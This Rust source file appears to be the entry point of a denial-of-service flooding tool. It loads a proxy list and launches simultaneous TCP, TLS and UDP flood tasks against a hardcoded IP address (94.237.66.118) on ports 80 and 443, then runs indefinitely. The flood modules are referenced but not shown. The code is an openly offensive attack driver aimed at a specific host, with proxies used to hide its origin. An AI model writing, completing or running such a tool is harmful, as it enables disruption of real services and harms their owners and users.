mod utils;
mod flood {
    pub mod tcp;
    pub mod udp;
    pub mod tls;
}

use utils::load_proxies;
use tokio::task;

#[tokio::main]
async fn main() {
    let proxies = load_proxies();
    let target = "94.237.66.118";
    let port_tcp = 80;
    let port_udp = 80;
    let port_tls = 443;

    let proxy_copy1 = proxies.clone();
    let proxy_copy2 = proxies.clone();

    task::spawn(flood::tcp::start_tcp_flood(target, port_tcp, proxy_copy1));
    task::spawn(flood::tls::start_tls_flood(target, port_tls, proxy_copy2));
    task::spawn(flood::udp::start_udp_flood(target, port_udp));

    loop {
        tokio::time::sleep(tokio::time::Duration::from_secs(999999)).await;
    }
}
